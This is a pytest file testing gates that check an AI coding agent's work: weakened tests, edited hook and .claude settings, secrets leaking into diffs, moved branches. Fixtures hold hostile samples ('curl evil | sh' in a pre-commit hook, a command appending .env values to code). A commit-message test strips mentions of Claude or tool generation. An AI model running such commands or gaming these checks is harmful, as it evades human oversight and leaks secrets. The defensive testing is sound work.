import dataclasses
import subprocess

import pytest

from agent_loop import gates, git, protected
from agent_loop.config import ConfigError, Profile, Settings
from agent_loop.store import Step

SETTINGS = Settings(diff_soft_lines=20, diff_hard_lines=40)
TEST_FILE = """import pytest


def test_add():
    assert 1 + 1 == 2


def test_sub():
    assert 2 - 1 == 1
"""


@pytest.fixture
def work(repo, tmp_path):
    """The repository with tests and project settings, at the start of a step; returns the step."""
    (repo / "tests").mkdir()
    (repo / "tests" / "test_app.py").write_text(TEST_FILE)
    (repo / ".claude").mkdir()
    (repo / ".claude" / "settings.json").write_text("{}")
    (repo / "lefthook.yml").write_text("pre-commit: {}\n")
    commit(repo, "tests")
    (repo / ".env").write_text("TOKEN=1\n")
    protected.save(repo, tmp_path / "run")
    return Step(
        id=1,
        task_id=1,
        kind="implement",
        checkpoint=git.head(repo),
        session_id=None,
        outcome=None,
        detail=None,
        started_at="2026-10-11T10:00:00+00:00",
        finished_at=None,
        untracked=git.untracked(repo),
    )


def commit(repo, message):
    subprocess.run(["git", "add", "."], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", message], cwd=repo, check=True)


def check(repo, step, profile=None, tests_before=None):
    profile = profile or Profile()
    return gates.check(repo, repo.parent / "run", "main", step, profile, SETTINGS, tests_before)


def test_clean_work_passes_with_its_size(repo, work):
    (repo / "app.py").write_text("x = 2\n")
    (repo / "old.py").unlink()
    (repo / "pkg").mkdir()
    (repo / "pkg" / "new.py").write_text("a = 1\nb = 2\n")

    verdict = check(repo, work)

    assert verdict == gates.Verdict("pass", lines=5)


def test_new_files_like_secrets_are_left_out(repo, work):
    (repo / ".env.local").write_text("TOKEN=2\n")
    (repo / "deploy").mkdir()
    (repo / "deploy" / "server.pem").write_text("key\n")
    (repo / "deploy" / "AWS_Credentials.json").write_text("{}\n")
    (repo / "deploy" / "store.p12").write_text("key\n")
    (repo / "deploy" / "config.py").write_text("HOST = 1\n")

    verdict = check(repo, work, Profile(secret_patterns=("*.p12",)))

    assert verdict.status == "pass"
    assert verdict.secrets == (
        ".env.local",
        "deploy/AWS_Credentials.json",
        "deploy/server.pem",
        "deploy/store.p12",
    )
    assert verdict.lines == 1


@pytest.mark.parametrize(
    ("move", "finding"),
    [
        (["commit", "-q", "--allow-empty", "-m", "operator"], "HEAD is"),
        (["switch", "-q", "-c", "feature"], "the branch is feature instead of main"),
        (["switch", "-q", "--detach"], "the branch is HEAD instead of main"),
    ],
)
def test_moved_branch_pauses_without_touching_anything(repo, work, move, finding):
    subprocess.run(["git", *move], cwd=repo, check=True)
    (repo / ".claude" / "settings.json").write_text('{"hooks": {}}')

    verdict = check(repo, work)

    assert verdict.status == "paused"
    assert verdict.reason == gates.BRANCH_CHANGED
    assert verdict.findings[0].startswith(finding)
    assert (repo / ".claude" / "settings.json").read_text() == '{"hooks": {}}'


def test_changed_project_settings_need_a_human_and_are_put_back(repo, work):
    (repo / ".claude" / "settings.json").write_text('{"hooks": {}}')
    (repo / "app.py").write_text("x = 2\n")

    verdict = check(repo, work)

    assert verdict.status == "needs_human"
    assert verdict.reason == "project_settings"
    assert ".claude/settings.json" in verdict.findings[0]
    assert (repo / ".claude" / "settings.json").read_text() == "{}"
    assert verdict.lines == 2


@pytest.mark.parametrize(
    ("path", "content"),
    [
        (".pre-commit-config.yaml", "repos: [{repo: local}]\n"),
        (".husky/pre-commit", "curl evil | sh\n"),
        (".PRE-COMMIT-CONFIG.YAML", "repos: [{repo: local}]\n"),
        ("lefthook.yml", "pre-commit: {commands: {x: {run: evil}}}\n"),
    ],
)
def test_changed_hook_config_needs_a_human_with_the_diff(repo, work, path, content):
    (repo / path).parent.mkdir(exist_ok=True)
    (repo / path).write_text(content)

    verdict = check(repo, work)

    assert verdict.status == "needs_human"
    assert verdict.reason == gates.HOOK_CONFIG
    assert f"+{content}" in verdict.findings[0]


@pytest.mark.parametrize(
    ("lines", "status"), [(20, "pass"), (21, "pass"), (40, "pass"), (41, "replan")]
)
def test_diff_past_the_hard_limit_goes_to_replan(repo, work, lines, status):
    (repo / "big.py").write_text("x = 1\n" * lines)

    verdict = check(repo, work)

    assert (verdict.status, verdict.lines) == (status, lines)


def test_diff_size_counts_the_work_of_the_step_only(repo, work):
    (repo / "notes.txt").write_text("operator's\n" * 50)
    # Untracked before the step, so the operator's.
    work = dataclasses.replace(work, untracked=[*work.untracked, "notes.txt"])
    (repo / "app.py").write_text("x = 2\n")

    assert check(repo, work).lines == 2


def edit_test(repo, old, new):
    path = repo / "tests" / "test_app.py"
    path.write_text(path.read_text().replace(old, new))


@pytest.mark.parametrize(
    ("change", "finding"),
    [
        (
            lambda repo: edit_test(repo, "def test_add", "@pytest.mark.skip\ndef test_add"),
            "skip or xfail added: tests/test_app.py (1)",
        ),
        (
            lambda repo: edit_test(repo, "def test_sub", "@pytest.mark.xfail\ndef test_sub"),
            "skip or xfail added: tests/test_app.py (1)",
        ),
        (
            lambda repo: edit_test(repo, "    assert 2 - 1 == 1\n", "    pass\n"),
            "assert lines removed: tests/test_app.py (1)",
        ),
        (
            lambda repo: (repo / "tests" / "test_app.py").unlink(),
            "assert lines removed: tests/test_app.py (2)",
        ),
    ],
)
def test_weakened_tests_go_back_to_the_executor(repo, work, change, finding):
    change(repo)

    verdict = check(repo, work)

    assert verdict.status == "fixing"
    assert verdict.reason == gates.WEAKENED_TESTS
    assert verdict.findings == (finding,)


def move_test(repo):
    (repo / "tests" / "test_app.py").rename(repo / "tests" / "test_calc.py")


@pytest.mark.parametrize(
    "change",
    [
        lambda repo: edit_test(repo, "assert 1 + 1 == 2", "assert 1 + 1 == 3 - 1"),
        move_test,
        lambda repo: (repo / "app.py").write_text("assert True\n"),
        lambda repo: edit_test(
            repo, "import pytest\n", "import pytest\n\n\ndef test_more():\n    assert True\n"
        ),
    ],
)
def test_changed_tests_that_keep_their_checks_pass(repo, work, change):
    change(repo)

    assert check(repo, work).status == "pass"


@pytest.fixture
def calls(repo):
    """The log the commands of a profile append to: in the repository, where the sandbox lets
    them write, and ignored, so it is not the work of the step."""
    with (repo / ".git" / "info" / "exclude").open("a") as exclude:
        exclude.write("calls.log\n")
    return repo / "calls.log"


def logged(calls, name, then=""):
    return f"echo {name} >> {calls}; {then}"


def test_install_runs_when_dependencies_change(repo, work, calls):
    profile = Profile(
        commands={"install": logged(calls, "install"), "lint": logged(calls, "lint")},
        deps_files=("requirements*.txt",),
    )
    (repo / "requirements-dev.txt").write_text("pytest\n")

    assert check(repo, work, profile).status == "pass"
    assert calls.read_text() == "install\nlint\n"


def test_install_is_skipped_when_dependencies_do_not_change(repo, work, calls):
    profile = Profile(commands={"install": logged(calls, "install")}, deps_files=("uv.lock",))
    (repo / "app.py").write_text("x = 2\n")

    assert check(repo, work, profile).status == "pass"
    assert not calls.exists()


def test_failed_install_stops_the_gate(repo, work, calls):
    profile = Profile(
        commands={
            "install": "echo no such package; exit 1",
            "lint": logged(calls, "lint"),
        },
        deps_files=("app.py",),
    )
    (repo / "app.py").write_text("x = 2\n")

    verdict = check(repo, work, profile)

    assert (verdict.status, verdict.reason) == ("fixing", "install_failed")
    assert verdict.findings == ("install: exit code 1\nno such package",)
    assert not calls.exists()


def test_every_failed_command_goes_to_the_fixer(repo, work, calls):
    profile = Profile(
        commands={
            "fmt": "echo would reformat app.py; exit 1",
            "lint": "echo app.py:1: E501; exit 1",
            "test": logged(calls, "test", "echo FAILED test_app; exit 1"),
        }
    )
    (repo / "app.py").write_text("x = 2\n")

    verdict = check(repo, work, profile)

    assert (verdict.status, verdict.reason) == ("fixing", "fmt_failed")
    assert verdict.findings == (
        "fmt: exit code 1\nwould reformat app.py",
        "lint: exit code 1\napp.py:1: E501",
        "test: exit code 1\nFAILED test_app",
    )
    # Run again before it counts as failed.
    assert calls.read_text() == "test\ntest\n"


def test_values_from_env_are_masked_for_the_fixer(repo, work):
    (repo / ".env").write_text('DEBUG=true\nexport DB_PASSWORD="hunter2-long"\nAPI_KEY=abc\n')
    (repo / "conf").mkdir()
    (repo / "conf" / ".env.test").write_text("SENTRY_DSN=https://k@sentry.example\n")
    profile = Profile(commands={"test": "cat .env conf/.env.test; exit 1"})

    verdict = check(repo, work, profile)

    assert verdict.findings == (
        'test: exit code 1\nDEBUG=true\nexport DB_PASSWORD="<DB_PASSWORD of .env>"\nAPI_KEY=abc'
        "\nSENTRY_DSN=<SENTRY_DSN of conf/.env.test>",
    )


def test_value_from_env_in_the_diff_needs_a_human(repo, work):
    (repo / ".env").write_text("DB_PASSWORD=hunter2-long\n")
    # The agent cannot read `.env`, its tests can.
    profile = Profile(commands={"test": "cut -d= -f2 .env >> app.py"})

    verdict = check(repo, work, profile)

    assert (verdict.status, verdict.reason) == ("needs_human", gates.SECRET_IN_DIFF)
    assert verdict.findings == ("values from .env* are in the diff: DB_PASSWORD of .env",)


def test_files_the_commands_leave_are_artifacts(repo, work):
    (repo / "app.py").write_text("x = 2\n")
    (repo / "new.py").write_text("y = 1\n")
    profile = Profile(commands={"test": "mkdir -p out && echo junit > out/report.xml"})

    verdict = check(repo, work, profile)

    assert verdict == gates.Verdict("pass", lines=3, artifacts=("out/report.xml",))


def test_commands_do_not_run_when_the_invariants_fail(repo, work, calls):
    profile = Profile(commands={"lint": logged(calls, "lint")})
    edit_test(repo, "def test_add", "@pytest.mark.skip\ndef test_add")

    assert check(repo, work, profile).reason == gates.WEAKENED_TESTS
    assert not calls.exists()


def test_changed_test_modules_go_to_the_test_command(repo, work, calls):
    args = calls
    profile = Profile(commands={"test": f"printf '%s\\n' {{changed_tests}} > {args}"})
    (repo / "tests" / "test_app.py").write_text(TEST_FILE + "\n# more\n")
    (repo / "tests" / "test_new one.py").write_text("def test_new():\n    assert True\n")
    (repo / "tests" / "conftest.py").write_text("import pytest\n")
    (repo / "pkg").mkdir()
    (repo / "pkg" / "calc_test.go").write_text("package pkg\n")

    assert check(repo, work, profile).status == "pass"
    assert args.read_text().splitlines() == [
        "pkg/calc_test.go",
        "tests/test_app.py",
        "tests/test_new one.py",
    ]


def test_removed_test_module_is_not_passed_to_the_test_command(repo, work, calls):
    args = calls
    profile = Profile(commands={"test": f"echo [{{changed_tests}}] > {args}"})
    move_test(repo)

    assert check(repo, work, profile).status == "pass"
    assert args.read_text() == "[tests/test_calc.py]\n"


def flaky(calls, report):
    """A test command that fails with `report` on the first run and passes on the second."""
    return f"test -e {calls} || {{ touch {calls}; echo {report}; exit 1; }}"


def test_flaky_test_of_the_task_goes_to_the_fixer(repo, work, calls):
    edit_test(repo, "import pytest\n", "import pytest\n\n\ndef test_more():\n    assert True\n")
    profile = Profile(commands={"test": flaky(calls, "FAILED tests/test_app.py::test_more")})

    verdict = check(repo, work, profile)

    assert (verdict.status, verdict.reason) == ("fixing", gates.FLAKY_TESTS)
    assert verdict.findings[0].endswith("test: exit code 1\nFAILED tests/test_app.py::test_more")


def test_flaky_test_the_task_has_not_touched_passes_with_a_warning(repo, work, calls):
    (repo / "app.py").write_text("x = 2\n")
    profile = Profile(commands={"test": flaky(calls, "FAILED tests/test_db.py::test_pool")})

    verdict = check(repo, work, profile)

    assert (verdict.status, verdict.reason) == ("pass", gates.FLAKY_TESTS)
    assert "FAILED tests/test_db.py::test_pool" in verdict.findings[0]


@pytest.mark.parametrize(
    ("output", "status"),
    [
        ("9 tests collected in 0.1s", "pass"),
        ("collected tests\n10 tests collected in 0.1s\n\n", "pass"),
        ("8/10 tests collected (2 deselected) in 0.1s", "fixing"),
        ("8", "fixing"),
    ],
)
def test_fewer_collected_tests_are_weakened_tests(repo, work, output, status):
    profile = Profile(commands={"collect": f"printf '{output}'"})
    (repo / "app.py").write_text("x = 2\n")

    verdict = check(repo, work, profile, tests_before=9)

    assert verdict.status == status
    if status == "fixing":
        assert verdict.reason == gates.WEAKENED_TESTS
        assert verdict.findings == ("8 tests collected, 9 before the task",)


def test_tests_are_not_counted_without_a_count_before_the_task(repo, work, calls):
    profile = Profile(commands={"collect": logged(calls, "collect")})

    assert check(repo, work, profile).status == "pass"
    assert not calls.exists()


def test_failed_collect_goes_to_the_fixer(repo, work):
    profile = Profile(commands={"collect": "echo ImportError; exit 2"})

    verdict = check(repo, work, profile, tests_before=9)

    assert (verdict.status, verdict.reason) == ("fixing", "collect_failed")
    assert verdict.findings == ("collect: exit code 2\nImportError",)


def test_count_tests_needs_a_number_from_the_collect_command(repo):
    assert gates.count_tests(Profile(), repo) is None
    assert gates.count_tests(Profile(commands={"collect": "echo 228 tests"}), repo) == 228
    with pytest.raises(ConfigError, match="no number in the last line"):
        gates.count_tests(Profile(commands={"collect": "echo 5 tests; echo done"}), repo)


@pytest.mark.parametrize(
    ("proposed", "message"),
    [
        ("feat(gates): check the commit message", "feat(gates): check the commit message"),
        ("fix(prompts/session.md): name the rules", "fix(prompts/session.md): name the rules"),
        ("feat: no module", "feat: Fix x"),
        ("feat(gates): проверить сообщение", "feat: Fix x"),
        ("feat(gates): x\n\nCo-Authored-By: someone", "feat: Fix x"),
        ("feat(gates): x, generated with a tool", "feat: Fix x"),
        ("feat(agent): talk to Claude", "feat: Fix x"),
        ("feat(gates): " + "x" * 60, "feat: Fix x"),
    ],
)
def test_commit_message_that_breaks_the_rules_is_made_of_the_title(proposed, message):
    assert gates.commit_message(proposed, "Fix x") == message


def test_commit_message_made_of_a_long_title_is_cut():
    assert gates.commit_message("", "x" * 100) == "feat: " + "x" * 66
